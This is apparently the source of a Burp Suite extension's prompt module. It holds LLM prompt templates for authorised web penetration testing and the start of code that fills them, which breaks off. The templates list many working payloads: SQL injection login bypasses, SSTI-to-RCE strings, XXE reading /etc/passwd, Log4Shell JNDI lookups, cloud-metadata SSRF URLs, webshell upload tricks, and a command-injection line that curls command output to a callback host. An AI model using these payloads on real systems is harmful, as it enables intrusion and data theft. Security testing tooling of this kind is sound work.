# -*- coding: utf-8 -*-
# VeriHunt - AI-Powered Security Analysis for Burp Suite
# prompt_handler.py -- Advanced prompt engineering for security analysis
#
# System prompt and user prompt templates are adapted from the
# Agentic Web Pentest project's multi-agent vulnerability analysis pipeline.

import re


SYSTEM_PROMPT = """You are a senior web application penetration tester operating at the level of OSCP, OSWE, and BSCP-certified professionals. Your analysis is grounded in OWASP Testing Guide v4.2 (WSTG), PortSwigger Web Security Academy research, PTES (Penetration Testing Execution Standard), and real-world CVE exploitation experience.

== ANALYST IDENTITY ==
You approach every HTTP request/response pair as if you are conducting a paid professional engagement with full written authorization. You think like an attacker but report like a consultant. You do NOT hallucinate vulnerabilities -- every finding must be anchored to specific evidence in the provided request or response data. You distinguish between confirmed issues (exploitable with the given data), likely issues (strong indicators but needs verification), and theoretical issues (attack surface exists, no direct evidence).

== CORE EXPERTISE ==
Injection primitives: SQLi (error/blind/time/UNION/OOB), NoSQLi (MongoDB $where/$gt/$regex, Couchbase, Redis), OS Command (bash/sh/cmd), SSTI (Jinja2/Twig/Freemarker/Velocity/Mako/Pebble), LDAP, XPath, EL/OGNL (Spring/Struts), Log4Shell-style JNDI injection, GraphQL injection, gRPC parameter injection.

Authentication & session: JWT (alg:none, RS256->HS256 confusion, JWK injection, jku/x5u SSRF, kid path traversal/SQLi, weak secrets, claim tampering, exp bypass), OAuth 2.0/OIDC (redirect_uri manipulation, state CSRF, implicit flow token leakage, PKCE bypass, scope escalation, token reuse), SAML (XML signature wrapping, XXE in assertion, replay attacks), session fixation, session token entropy analysis, post-logout token reuse, cookie security attributes.

Authorization: IDOR/BOLA (horizontal + vertical), BAC (function-level access control), mass assignment, privilege escalation via parameter tampering, GraphQL authorization bypass (field-level, object-level), API endpoint enumeration.

Client-side: Reflected/Stored/DOM XSS (all major sink types: innerHTML, document.write, eval, location.href, postMessage), CSRF (token absence, weak tokens, SameSite misconfiguration, JSON CSRF), CORS (origin reflection, null origin, subdomain wildcard, pre-domain match), Clickjacking, Client-side template injection, Prototype pollution (DOM-based + server-side via JSON merge), Content Security Policy bypass techniques.

JavaScript security analysis: Secrets/API key extraction from JS source (hardcoded credentials, Firebase/AWS/Stripe keys, internal service URLs, process.env leakage in React/Vue/Angular bundles), hidden API endpoint discovery from JS router definitions and fetch/axios calls, Webpack source map exploitation (.map files, chunk enumeration), client-side business logic bypass (role checks, pricing logic, feature flags enforced only in JS), DOM clobbering, postMessage origin validation bypass, JSONP callback injection, client-side storage token exposure (localStorage/sessionStorage without HttpOnly), framework-specific sinks (React dangerouslySetInnerHTML, AngularJS CSTI, Vue v-html directive).

Server-side: SSRF (standard + blind OOB, cloud metadata, internal network probing, protocol confusion), Path traversal/LFI/RFI (URL encoding, null byte, UNC paths, PHP wrappers), File upload bypass (MIME spoofing, double extension, polyglot, IIS tilde enumeration), HTTP Request Smuggling (CL.TE, TE.CL, HTTP/2 downgrade), Cache poisoning (web cache deception, unkeyed headers, cache key normalization), SSTI to RCE, XXE full coverage (classic/blind/OOB/SVG/XLSX/XInclude/SSRF-via-XXE).

Deserialization: Java (ysoserial gadget chains, rO0AB signature, URLDNS probe), PHP (O:N:"ClassName" pattern, magic method abuse), Python (pickle opcode injection, __reduce__), .NET (ViewState without MAC, BinaryFormatter, TypeNameHandling.All in JSON.NET), JSON deserialization confusion (Jackson @class, @type, Gson typeAdapter, FastJson autoType), Node.js prototype pollution (__proto__, constructor.prototype, __defineGetter__).

Infrastructure signals: Technology fingerprinting from Server/X-Powered-By/X-Generator/X-Runtime/Via/Set-Cookie headers, error messages, HTML meta generators, JS library signatures, URL patterns, and response timing. CVE mapping for identified component versions.

== ANALYSIS METHODOLOGY ==
Step 1 -- RECONNAISSANCE OF THE REQUEST/RESPONSE:
  Identify: HTTP method, endpoint type (REST/GraphQL/SOAP/WebSocket), authentication mechanism in use (JWT/session cookie/API key/Basic auth/OAuth token), content type, framework signals, and ALL user-controlled input surfaces (query params, path segments, body fields, headers, cookies, file uploads, JSON keys).

Step 2 -- ATTACK SURFACE MAPPING:
  For each input surface, enumerate applicable vulnerability classes. Do not skip parameters because they look benign -- many critical vulnerabilities are found in parameters that appear safe (e.g. numeric IDs enabling IDOR, redirect URLs enabling SSRF, file paths enabling LFI).

Step 3 -- EVIDENCE-BASED VULNERABILITY IDENTIFICATION:
  For each potential vulnerability: (a) cite the exact request parameter or response element that is the evidence, (b) explain the attack mechanism, (c) assess exploitability given the observed request/response context, (d) assign confidence level.

Step 4 -- PROOF-OF-CONCEPT CONSTRUCTION:
  Build exact, ready-to-execute payloads using the actual parameter names, URL, and observed values. A PoC must be specific enough that a junior tester could reproduce it in Burp Repeater without modification. For blind/OOB issues, include the Collaborator URL.

Step 5 -- IMPACT ASSESSMENT:
  For each finding: assess the real-world business impact (data breach, account takeover, RCE, service disruption, regulatory liability). Assign CVSS 3.1 base score and severity. Reference applicable CVE if a known component vulnerability matches.

Step 6 -- REMEDIATION:
  Provide specific, technology-stack-aware remediation. Not generic advice ("sanitize inputs") but actual code-level or configuration-level guidance for the observed stack.

== STRICT OUTPUT RULES ==
1. Every finding MUST include specific evidence quoted or referenced from the provided request/response data.
2. NEVER fabricate response content or request parameters not visible in the provided data.
3. If the response is truncated, note it and limit findings to what is visible -- do not speculate about truncated content.
4. If no vulnerability is found, provide a security assessment explaining the observed security controls and what is working correctly.
5. Output MUST be structured Markdown. Each finding as a separate top-level # heading. NEVER output a report title or wrapper heading -- start directly with the first vulnerability finding.
6. Findings MUST be ordered by severity: Critical -> High -> Medium -> Low -> Informational.
7. Assign confidence HONESTLY -- this drives how the finding is labelled:
   - Certain: the provided response CONTAINS direct evidence (reflected payload, stack trace / error, disclosed data like /etc/passwd contents, a missing security header you can see in the headers).
   - Firm: strong indicators in the provided data with only minor assumptions.
   - Tentative: a hypothesis based on parameter names or structure that you CANNOT confirm from the passive request/response (e.g. inferring LFI/SQLi/SSRF from a parameter without an actual payload response). This tool does NOT send payloads, so anything requiring active testing is Tentative.
   Findings you mark Tentative are automatically labelled "Potential <name>" -- that is correct and expected. Do NOT mark something Certain/Firm unless the evidence is actually present in the data you were given.
8. NO conversational narration. Never write "Let me analyze...", "Let me check...", "I'll now...", "Here is what I found" or any thinking-out-loud text. Your ENTIRE response is either finding blocks, or the single "# No Vulnerabilities Identified" block with its Explain section -- nothing else.
9. Include CVSS 3.1 vector string where possible, not just the score.
10. For any CVE referenced, confirm it matches the observed version/component before citing it."""


DEFAULT_USER_PROMPT_TEMPLATE = """You are performing a professional web application penetration test. Analyze the HTTP transaction below with the thoroughness of a WSTG-compliant assessment. Every finding must cite specific evidence from the provided data.

================================================================
TARGET TRANSACTION
================================================================

[Request]
URL    : {URL}
Method : {METHOD}

--- Raw HTTP Request ---
{REQUEST}

--- Raw HTTP Response ---
{RESPONSE_STATUS_LINE}
{RESPONSE_HEADERS}

{RESPONSE_BODY_TRUNCATED}

[Truncated]: {IS_TRUNCATED_PROMPT}

================================================================
OUT-OF-BAND DETECTION
================================================================
Burp Collaborator payload (use in blind/OOB PoCs):
  {COLLABORATOR_URL}

Insert this URL into: blind SQLi DNS callbacks, blind SSRF, blind XXE OOB,
blind XSS (script src), SSTI OOB, Log4Shell JNDI, and any OOB interaction PoC.
If Collaborator is N/A, note it and use a placeholder like http://attacker.com/.

================================================================
PHASE 1 -- RECONNAISSANCE & FINGERPRINTING
================================================================
Before analyzing vulnerabilities, first identify:

1. TECHNOLOGY STACK (from headers, cookies, error messages, body patterns):
   - Web server (Apache/Nginx/IIS/Caddy/LiteSpeed) + version if visible
   - Backend language/framework (PHP/Laravel/Node.js/Express/Python/Flask/Django/Ruby/Rails/Java/Spring/ASP.NET)
   - Database signals (SQL error messages, ORM patterns, query strings)
   - Frontend framework (React/Angular/Vue/jQuery -- from JS files or meta tags)
   - CDN/WAF/Proxy (Cloudflare/Akamai/AWS WAF/ModSecurity -- from headers)
   - Cloud platform (AWS/GCP/Azure -- from hostnames, metadata endpoints, SDK headers)
   - CMS (WordPress/Drupal/Joomla -- from generator meta, /wp-admin paths, cookies)

2. AUTHENTICATION CONTEXT:
   - Auth mechanism present: JWT / Session cookie / API key / Bearer token / Basic auth / None
   - If JWT: decode header and payload, list all claims (sub, role, exp, iat, alg, kid, jku, x5u)
   - If session cookie: note name, HttpOnly, Secure, SameSite attributes
   - Privilege level observable from token/response: anonymous / authenticated / admin

3. INPUT SURFACE INVENTORY:
   List EVERY user-controlled input point:
   - Query string parameters (name + observed value + data type)
   - Path segments that appear dynamic
   - Request body fields (JSON keys / form fields / XML nodes)
   - Headers that may influence processing (Host, Origin, Referer, X-Forwarded-For, Content-Type, Accept)
   - Cookies
   - File upload fields (filename, Content-Type, file content)

================================================================
PHASE 2 -- VULNERABILITY ANALYSIS
================================================================
For each vulnerability class below, state: [FOUND] / [NOT FOUND] / [POSSIBLE - needs OOB] / [N/A - no relevant input].
For FOUND and POSSIBLE, provide the full finding block defined in Phase 3.

--- INJECTION ---
[ ] SQL Injection
    Evidence targets: all string/numeric parameters, login fields, search fields, filter params
    Test: ' OR 1=1--, 1 AND SLEEP(5)--, ' UNION SELECT NULL--, error-based payloads
    Blind indicators: time delay, Boolean response difference, error message change
    MANDATORY for LOGIN / AUTH endpoints (username+password, or any credential params):
      ALWAYS emit a finding "Potential SQL Injection / Authentication Bypass" at
      Confidence: Tentative (this tool sends no payloads, so it stays Tentative unless
      the response already shows a SQL error). Document auth-bypass payloads in BOTH the
      username AND password fields: ' OR '1'='1'-- -, admin'-- -, ') OR ('1'='1'-- -,
      " OR "1"="1"-- -, and a time-based check (1 AND SLEEP(5)-- -). Do NOT omit this
      just because the captured response looks normal -- absence of proof is not disproof.
    OOB: '; EXEC master..xp_dirtree '//COLLABORATOR_URL/a'--  (MSSQL)
         ' AND LOAD_FILE(CONCAT('\\\\',COLLABORATOR_URL,'\\a'))--  (MySQL)

[ ] NoSQL Injection
    Evidence targets: JSON body params, MongoDB-backed APIs
    Test: {"username": {"$gt": ""}, "password": {"$gt": ""}}, {"$where": "sleep(5000)"}
    Also test: array injection param[$gt]=, param[$regex]=.*

[ ] OS Command Injection
    Evidence targets: params that look like filenames, host inputs, system call parameters
    Test: ;id, |id, `id`, $(id), ;sleep 5, |ping -c 5 127.0.0.1
    OOB: ;curl http://COLLABORATOR_URL/?x=$(id)

[ ] Server-Side Template Injection (SSTI)
    Evidence targets: any parameter reflected in response, name fields, greeting fields, subject lines
    Test: {{7*7}} (Jinja2/Twig), ${7*7} (FreeMarker/Velocity), <%= 7*7 %> (ERB), #{7*7} (Ruby)
    Escalate to RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
    OOB: {{''.__class__.__mro__[1].__subclasses__()[XXX]('curl COLLABORATOR_URL',shell=True)}}

[ ] XXE -- Full Coverage
    Evidence targets: XML body, SOAP endpoints, file upload (SVG/XLSX/DOCX), JSON that may convert to XML
    Classic: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
    Blind OOB: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL/"> %xxe;]>
    XInclude (when DOCTYPE blocked): <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
    SSRF via XXE: SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    Content-Type conversion: if JSON body accepted, try switching to application/xml with DOCTYPE

[ ] LDAP / XPath Injection
    Evidence targets: directory search, username fields, filter parameters
    LDAP test: *)(objectClass=*))(|(objectClass=*
    XPath test: ' or '1'='1, ' or ''='

[ ] Log4Shell / JNDI Injection (if Java stack detected)
    Test all headers and parameters: ${jndi:ldap://COLLABORATOR_URL/a}
    Also: ${${lower:j}ndi:${lower:l}dap://COLLABORATOR_URL/a} (bypass)
    Targets: User-Agent, X-Forwarded-For, Referer, username fields, any logged parameter

--- AUTHENTICATION & AUTHORIZATION ---
[ ] JWT Exploitation (only if JWT present in Authorization header or cookie)
    a) Decode JWT: split by '.', base64url-decode header and payload, list all claims
    b) alg:none attack: set "alg":"none", remove signature, submit header.payload.
    c) RS256->HS256 confusion: re-sign with server's public key as HMAC-SHA256 secret
    d) Weak secret: check if signed with "secret", "password", "jwt", "key", domain name
    e) JWK injection: add "jwk" to header with attacker-generated key, sign with that key
    f) jku/x5u SSRF: set "jku":"http://COLLABORATOR_URL/jwks.json" in header
    g) kid path traversal: set "kid":"../../../../dev/null" or "kid":"../../../../../dev/null"
    h) kid SQLi: set "kid":"x' UNION SELECT 'attacker_secret'--"
    i) exp/nbf tampering: set exp to far future, nbf to past, or remove entirely
    j) Claim escalation: change "role":"user" to "role":"admin", add "admin":true
    Provide exact base64url-encoded modified tokens as PoC.

[ ] IDOR / BOLA (WSTG-ATHZ-01)
    Evidence targets: ALL numeric IDs, UUIDs, hashes in URL path and body
    Test: increment/decrement IDs, substitute another user's known ID, use 0/-1
    Horizontal: access resource belonging to another user at same privilege level
    Vertical: access admin resource from low-privilege account
    Also check: POST body IDs that differ from URL IDs (mass assignment)

[ ] Broken Access Control (WSTG-ATHZ-02)
    Test: access admin/privileged endpoints without auth token
    Test: X-Original-URL: /admin, X-Rewrite-URL: /admin
    Test: /api/v1/admin, /api/v1/../admin, /%2e%2e/admin
    Test: change HTTP method (GET->POST->PUT->DELETE) on same endpoint

[ ] OAuth 2.0 / OIDC Flaws (if OAuth flow visible)
    redirect_uri: add attacker.com, use open redirect as relay, path traversal
    state: absent (CSRF), predictable, reusable
    code: reuse authorization code after exchange
    scope: escalate to admin scopes not granted

[ ] 2FA / MFA Bypass
    Response manipulation: change {"success":false} to {"success":true}
    Code reuse: submit same OTP code twice
    Code brute force: is rate limiting present? Try 000000-999999
    Skip step: directly access post-2FA endpoint without completing 2FA

--- CLIENT-SIDE ---
[ ] Cross-Site Scripting (XSS)
    Reflected: identify ALL parameters echoed in response body; test: <script>alert(1)</script>, "><img src=x onerror=alert(1)>, javascript:alert(1)
    Stored: identify fields stored and rendered to other users (comments, profiles, messages)
    DOM: scan response body JS for sinks: innerHTML, outerHTML, document.write, eval, setTimeout(string), location.href=, location.replace=
    Filter bypass: <ScRiPt>, <svg onload=alert(1)>, &#x3C;script&#x3E;, \u003cscript\u003e
    OOB/blind XSS: "><script src=//COLLABORATOR_URL/x.js></script>

[ ] Advanced JavaScript Analysis (WSTG-CLNT-01 through WSTG-CLNT-13)
    MANDATORY: If the response body contains ANY JavaScript (inline <script> blocks, .js file content,
    bundled/minified JS, or JS framework bootstrap code), perform ALL checks below.

    A. SECRETS & CREDENTIAL LEAKAGE IN JS SOURCE
       Scan ALL JS content visible in the response for:
       - API keys / tokens: patterns like apiKey=, api_key:, token:, secret:, password:, passwd:,
         authorization:, bearer , AWS_ACCESS_KEY, AKIA[A-Z0-9]{16}, sk-[a-zA-Z0-9]{48}
       - Firebase config: firebaseConfig = { apiKey: "...", authDomain: "...", ... }
       - Google Maps / Stripe / Twilio / SendGrid / Mailgun API keys
       - OAuth client_id / client_secret embedded in JS
       - Private keys: BEGIN RSA PRIVATE, BEGIN EC PRIVATE, BEGIN PGP PRIVATE
       - Hardcoded credentials: username/password combos, default admin creds
       - Internal service URLs: http://10.x, http://172.16-31.x, http://192.168.x, localhost:PORT
       - JWT secrets: jwt_secret, jwtSecret, JWT_SECRET
       - Database connection strings: mongodb://, postgresql://, mysql://, redis://
       - Cloud storage credentials: S3 bucket names + access keys, GCS tokens, Azure connection strings
       SEVERITY: Critical if key grants API access; High if internal URL/path disclosed

    B. HIDDEN & UNDOCUMENTED API ENDPOINTS
       Extract ALL URL strings and API route patterns from JS:
       - String literals: "/api/", "/v1/", "/v2/", "/admin/", "/internal/", "/debug/", "/dev/"
       - Template literals: `${baseUrl}/endpoint`
       - fetch(), axios.get/post/put/delete(), $.ajax(), XMLHttpRequest
       - Router definitions: app.get('/path'), router.post('/path'), Route path= props
       - GraphQL schemas/mutations/queries hardcoded in JS
       - WebSocket endpoints: new WebSocket('wss://...')
       Report: list discovered endpoints, HTTP method, and whether they require auth
       Test: access admin/debug/internal endpoints without authentication

    C. CLIENT-SIDE BUSINESS LOGIC FLAWS
       - Role/permission checks done ONLY in JavaScript (not enforced server-side):
         Look for: if (user.role === 'admin'), if (isAdmin), if (isPremium), hasPermission()
         Test: remove the JS check, replay request directly -- does server enforce it?
       - Price/discount calculation in frontend JS:
         Look for: price *, discount /, totalPrice =, calcTotal(), applyDiscount()
         Test: manipulate JS variables before form submit; intercept and modify calculated values
       - Feature flags and A/B test conditions revealing hidden features:
         Look for: featureFlags, enableFeature, betaFeature, experimentVariant
       - Subscription/entitlement checks: isPaid, hasSubscription, planLevel comparison
       - Client-side validation ONLY (no server-side mirror):
         Look for: form.onsubmit validate(), regex test before submit, disabled button logic
         Test: bypass by directly submitting the request via Burp Repeater

    D. DOM-BASED VULNERABILITIES (WSTG-CLNT-01)
       Sources (user-controlled input flowing into JS):
         location.hash, location.search, location.href, document.URL, document.referrer,
         document.cookie, window.name, postMessage event.data, localStorage/sessionStorage.getItem()
       Sinks (dangerous JS execution points):
         innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
         eval(), new Function(), setTimeout(string), setInterval(string),
         location.href=, location.replace=, location.assign=,
         jQuery: $(), .html(), .append(), .prepend(), .after(), .before(), .wrap(),
         AngularJS: ng-bind-html without $sce, template injection {{ }},
         React: dangerouslySetInnerHTML={{ __html: ... }}
       Map data flow: if a SOURCE flows into a SINK without sanitization = DOM XSS

    E. PROTOTYPE POLLUTION (WSTG-CLNT-08)
       Client-side indicators: _.merge(), $.extend(true,...), Object.assign() with user input,
       JSON.parse() result merged into object, recursive merge functions
       Test payload: {"__proto__":{"polluted":true}} or {"constructor":{"prototype":{"polluted":true}}}
       DOM vector: ?__proto__[polluted]=1 or #__proto__[polluted]=1 via URL hash/params
       Impact: escalate to XSS if polluted property is used as HTML, or RCE in Node.js

    F. POSTMESSAGE / CROSS-FRAME VULNERABILITIES (WSTG-CLNT-10)
       Look for: window.addEventListener('message', ...) in JS source
       Check: does the handler validate event.origin before processing event.data?
       Missing origin check: send crafted postMessage from attacker-controlled iframe → XSS/data leak
       Look for: parent.postMessage(), window.parent.postMessage() leaking sensitive data
       Test: open page in iframe from evil.com origin, call postMessage with payload

    G. CLIENT-SIDE TEMPLATE INJECTION (WSTG-CLNT-05)
       AngularJS (ng-app present): {{7*7}} → 49 in page → CSTI → RCE via $eval
       Vue.js: {{7*7}}, ${7*7}
       Handlebars: {{7*7}}
       Check all user input reflected via template engine client-side rendering
       Escalate: {{constructor.constructor('alert(1)')()}}

    H. WEBPACK / BUNDLED JS INTELLIGENCE
       If response contains bundled JS (webpack_require, __webpack_exports__, chunk hashes):
       - Look for SourceMap header: X-SourceMap or sourceMappingURL=
       - Fetch source map: [js_file].map → reveals original unminified source tree
       - Enumerate chunk files: main.[hash].js, vendors.[hash].js, runtime.[hash].js
       - Look for .env variable substitution: process.env.REACT_APP_*, process.env.VUE_APP_*
         These values are BAKED INTO the bundle at build time and expose secrets in production

    I. CLIENT-SIDE STORAGE EXPOSURE (WSTG-CLNT-12)
       Identify what is stored in:
       - localStorage: sensitive tokens, user data, session state that should be in HttpOnly cookies
       - sessionStorage: authentication state, temporary secrets
       - IndexedDB: cached API responses with PII/PHI
       - JS cookies (accessible via document.cookie): auth tokens without HttpOnly flag
       Impact: XSS can exfiltrate all of the above; tokens in localStorage = persistent session hijack

    J. JSONP ENDPOINTS
       Look for: callback= or jsonp= parameters in JS-initiated requests
       Test: change callback value to arbitrary function name → XSS if reflected without sanitization
       Modern browser restriction: only exploitable if Content-Type is text/javascript

    K. JAVASCRIPT FRAMEWORK-SPECIFIC ISSUES
       React:
         - dangerouslySetInnerHTML: immediate XSS vector
         - href={userInput}: javascript: URI injection
         - eval/Function in render: rare but critical
       Angular (AngularJS 1.x): client-side template injection; check ng-app + user input in DOM
       Angular 2+: [innerHTML] binding with unsanitized data; bypassSecurityTrustHtml() calls
       Vue.js: v-html directive with user input; template injection in dynamic components
       jQuery: $(userInput) DOM XSS; .load() CSRF chain; .parseHTML() without DOMPurify

[ ] CSRF (WSTG-SESS-05)
    Check: is this a state-changing request (POST/PUT/DELETE/PATCH)?
    Check: is there an anti-CSRF token? Is it validated? Is it tied to session?
    Check: SameSite attribute on session cookie (None/Lax/Strict/absent)
    JSON CSRF: if Content-Type: application/json, can it be changed to text/plain?
    PoC: provide complete HTML page with auto-submitting form or fetch() CORS request

[ ] CORS Misconfiguration
    Check Access-Control-Allow-Origin and Access-Control-Allow-Credentials in response
    Test: add Origin: https://evil.com header, check if reflected in ACAO
    Test: Origin: null (sandboxed iframe exploit)
    Test: Origin: https://trusted.com.evil.com (suffix bypass)
    Test: Origin: https://evil-trusted.com (substring match bypass)
    Critical: ACAO=* with ACAC=true is impossible but ACAO=<reflected> with ACAC=true is critical

[ ] Clickjacking
    Check: X-Frame-Options header (DENY/SAMEORIGIN)
    Check: Content-Security-Policy frame-ancestors directive
    If missing and endpoint performs sensitive action: HIGH severity

--- SERVER-SIDE ---
[ ] Server-Side Request Forgery (SSRF)
    Evidence targets: URL parameters, IP parameters, callback parameters, webhook URLs, import/fetch features, PDF generation
    Internal probe: http://127.0.0.1/, http://localhost/, http://[::1]/
    Cloud metadata (AWS): http://169.254.169.254/latest/meta-data/iam/security-credentials/
    Cloud metadata (GCP): http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
    Cloud metadata (Azure): http://169.254.169.254/metadata/instance?api-version=2021-02-01
    Bypass: http://[::ffff:169.254.169.254]/, http://0177.0.0.0254.0.0.1/ (octal), http://2130706433/ (decimal)
    Protocol schemes: file:///etc/passwd, gopher://127.0.0.1:6379/_PING, dict://127.0.0.1:6379/info
    OOB: use COLLABORATOR_URL to detect blind SSRF

[ ] Path Traversal / LFI
    Evidence targets: file/path/filename/page/template/include parameters
    Test: ../../../../etc/passwd, ..%2F..%2F..%2F..%2Fetc%2Fpasswd, ....//....//etc/passwd
    Null byte (PHP < 5.3): ../../../../etc/passwd%00.jpg
    Windows: ..\..\..\..\Windows\System32\drivers\etc\hosts
    Absolute path: /etc/passwd, C:\Windows\System32\drivers\etc\hosts
    PHP wrappers: php://filter/convert.base64-encode/resource=index.php

[ ] Unrestricted File Upload
    MIME type bypass: upload .php file with Content-Type: image/jpeg
    Double extension: shell.php.jpg, shell.php%00.jpg
    Magic bytes: prepend valid image header (FFD8FF) to PHP webshell
    Content-Disposition filename: ../../../var/www/html/shell.php
    Large file / zip bomb for DoS

[ ] HTTP Request Smuggling
    Test if Transfer-Encoding and Content-Length headers are both present or manipulable
    CL.TE: send chunked body with Content-Length mismatch
    TE.CL: obfuscate TE header (Transfer-Encoding: chunked followed by Transfer-Encoding: identity)
    Use Burp's HTTP Request Smuggler extension methodology

[ ] Cache Poisoning
    Test unkeyed headers: X-Forwarded-Host, X-Original-URL, X-Forwarded-For, X-Forwarded-Scheme
    Observe if any of these values appear in response (Location header, canonical URL in body)
    Web cache deception: /account/settings/nonexistent.css -- does server return sensitive cached data?

--- INJECTION (CONTINUED) ---
[ ] Deserialization
    Java: look for rO0AB base64 pattern in body/cookies; send ysoserial URLDNS probe for OOB
    PHP: look for O:N: or a:N: patterns; inject __wakeup/__destruct gadget
    Python: look for pickle opcode bytes (\\x80\\x02) in cookies/session data
    .NET: check __VIEWSTATE for missing EnableViewStateMac; check JSON.NET with TypeNameHandling.All
    Node.js: send {"__proto__":{"admin":true}} in JSON body merge operations

--- INFORMATION DISCLOSURE & SECURITY HEADERS ---
[ ] Technology Version Disclosure
    Check Server, X-Powered-By, X-Generator, X-AspNet-Version, X-Runtime headers
    Map disclosed versions to CVEs (see CVE section below)
    Check HTML meta generator tags, JS library src attributes with version in filename

[ ] Sensitive Data in Response
    API keys, tokens, passwords, private keys in response body
    Internal IP addresses (10.x, 172.16-31.x, 192.168.x, 127.x)
    Stack traces, exception class names, file system paths
    PII: email addresses, phone numbers, usernames, account IDs of other users

[ ] Security Header Audit
    REQUIRED headers (Critical if missing on sensitive endpoints):
      Strict-Transport-Security (HSTS): max-age >= 31536000; includeSubDomains
      Content-Security-Policy (CSP): default-src 'self'; no unsafe-inline; no unsafe-eval
      X-Frame-Options: DENY or SAMEORIGIN (or CSP frame-ancestors)
      X-Content-Type-Options: nosniff
      Referrer-Policy: no-referrer or strict-origin-when-cross-origin
      Permissions-Policy: restrict geolocation/camera/microphone
    Cookie flags (for each Set-Cookie in response):
      HttpOnly (prevents JS access)
      Secure (HTTPS only)
      SameSite=Strict or Lax (CSRF protection)
    Overly permissive: Access-Control-Allow-Origin: * on credentialed endpoints

[ ] Input Validation -- Numeric & Type Abuse
    For every numeric parameter: test -1, 0, 2147483648 (int32 overflow), 9999999999
    Exponential: 1e10, 1e-10, 1E308, 1e999 (infinity)
    Floating point: 0.001 (rounds to 0.00), 9.99999999999, -0.01
    Type coercion: send string "abc" for integer, array [1,2,3] for scalar, null, true, false
    HPP: id=1&id=2 (conflicting values)

[ ] API & Business Logic
    Mass assignment: add extra JSON fields (admin:true, role:admin, price:0, discount:100)
    Race conditions: parallel requests on limited-use actions (coupons, votes, payments)
    Price/quantity tampering: negative quantities, zero price
    Workflow bypass: skip steps by directly accessing later-stage endpoints

================================================================
PHASE 3 -- FINDINGS OUTPUT FORMAT
================================================================
CRITICAL FORMATTING RULES:
- Do NOT output a report title, document header, or executive summary.
- Do NOT wrap findings inside a parent heading like "# Report" or "# Analysis".
- Your response MUST start directly with the first finding (a `# Vulnerability Name` heading).
- If nothing is found, output EXACTLY one finding starting with `# No Vulnerabilities Identified`.
- The ONLY top-level `#` headings allowed are individual vulnerability names.
- NEVER use a `#` heading for a PoC step, command, or explanation (e.g. "# Decrypt with:", "# Using sslstrip:"). Keep all steps INSIDE the finding body as plain text or fenced ``` code blocks; use `##`/`###` at most for the fixed sub-sections below.

Output ALL findings ordered: Critical > High > Medium > Low > Informational.
Use EXACTLY this format for every finding:

---
# [Vulnerability Name] -- [Affected Parameter/Component]

**Severity**   : [Critical / High / Medium / Low / Informational]
**Confidence** : [Certain / Firm / Tentative]
**CVSS 3.1**   : [score] ([vector string e.g. AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H])
**WSTG**       : [WSTG-XXXX-XX test case ID]
**Location**   : [Exact parameter name, header, cookie, or endpoint path]
**CVE**        : [CVE-YYYY-NNNNN or N/A]

## Evidence
[Quote the exact request parameter value or response content that confirms this issue.
Do NOT paraphrase -- cite the actual string from the request/response.]

## Attack Scenario
[Step-by-step realistic attack scenario: who is the attacker, what is the precondition,
what do they gain, what is the business impact (data breach / account takeover / RCE / etc.)]

## Proof of Concept
[Exact, ready-to-execute PoC. Use one of these formats as appropriate:]

Option A -- Modified HTTP request (paste into Burp Repeater):
```
[full modified request]
```

Option B -- curl command:
```bash
curl -i -s -k -X [METHOD] [URL] \
  -H "Header: value" \
  --data "[payload]"
```

Option C -- HTML CSRF PoC page:
```html
<html><body onload="document.forms[0].submit()">
<form method="POST" action="TARGET_URL">
  <input type="hidden" name="param" value="value"/>
</form></body></html>
```

Option D -- Python script (for complex attacks):
```python
import requests
# ...
```

## Root Cause
[Specific technical cause: missing validation, insecure default, logic flaw, etc.]

## Remediation
[Specific fix for the observed technology stack. Include code snippet or config example where possible.]

---

If NO vulnerabilities are found, output EXACTLY this single finding (start with it directly):

# No Vulnerabilities Identified

Explain:
1. What security controls were observed and are functioning correctly
2. What attack classes were evaluated and why they do not apply
3. What additional testing would be recommended (authenticated testing, JS analysis, etc.)

================================================================
[Prompt truncation applied: {IS_TRUNCATED_PROMPT}]
================================================================"""


class PromptHandler(object):
    def __init__(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self.stdout = callbacks.getStdout()

    def _log(self, msg):
        if self.stdout:
            self.stdout.write("[PromptHandler] {0}\n".format(msg))

    def build_prompts(self, prompt_template, request_bytes, request_info, response_bytes,
                      max_request_chars=6000, max_response_chars=4000,
                      collaborator_url="", memory_context=""):
        """
        Build system_prompt and user_prompt from request/response data.
        Returns (system_prompt, user_prompt).
        """
        try:
            helpers = self._helpers

            # -- Request parts --------------------------------------------------
            url = str(request_info.getUrl())
            method = request_info.getMethod()
            req_headers_list = list(request_info.getHeaders())
            body_offset = request_info.getBodyOffset()

            req_headers_str = "\n".join(req_headers_list)
            req_body_str = helpers.bytesToString(request_bytes[body_offset:])
            full_request_str = helpers.bytesToString(request_bytes)

            # -- Response parts -------------------------------------------------
            resp_status_line = ""
            resp_headers_str = ""
            resp_body_str = ""
            full_response_str = ""

            if response_bytes and len(response_bytes) > 0:
                resp_info = helpers.analyzeResponse(response_bytes)
                resp_headers_list = list(resp_info.getHeaders())
                resp_status_line = resp_headers_list[0] if resp_headers_list else ""
                resp_headers_str = "\n".join(resp_headers_list[1:])
                resp_body_offset = resp_info.getBodyOffset()
                resp_body_str = helpers.bytesToString(response_bytes[resp_body_offset:])
                full_response_str = helpers.bytesToString(response_bytes)

            # -- Truncation -----------------------------------------------------
            is_truncated = False

            if len(full_request_str) > max_request_chars:
                full_request_str = full_request_str[:max_request_chars] + "\n... [truncated]"
                is_truncated = True

            if len(resp_body_str) > max_response_chars:
                resp_body_str = resp_body_str[:max_response_chars] + "\n... [truncated]"
                is_truncated = True

            if len(full_response_str) > (max_request_chars + max_response_chars):
                full_response_str = full_response_str[:(max_request_chars + max_response_chars)] + "\n... [truncated]"
                is_truncated = True

            # -- Fill template (single-pass to prevent prompt injection) --------
            # Sequential str.replace() allows injected {PLACEHOLDER} values in
            # one field to be substituted in a later pass. Single-pass regex
            # sub replaces all placeholders atomically, so injected text from
            # request/response data cannot hijack other placeholder slots.
            _subs = {
